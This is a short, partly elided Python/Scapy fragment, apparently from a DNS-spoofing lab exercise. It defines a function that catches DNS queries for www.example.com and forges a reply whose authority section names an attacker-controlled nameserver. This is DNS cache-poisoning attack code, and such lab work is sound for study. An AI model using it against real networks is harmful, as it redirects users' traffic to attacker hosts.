...
def spoof_dns (pkt) :
    ...
    if(DNS in pkt and 'www.example.com' in pkt[DNS].qd.qname.decode("utf-8")):
        ...
        NSSec= DNSRR( rrname="attacker.com", type='NS' , rdata='ns1.attacker32.com', ttl=259200)
        DNSpkt = DNS (id=pkt[DNS].id, qd=pkt[DNS].qd,aa=1, rd=0, qdcount=1, qr=1, ancount=1,nscount=1,ns=NSSec, an=Anssec)
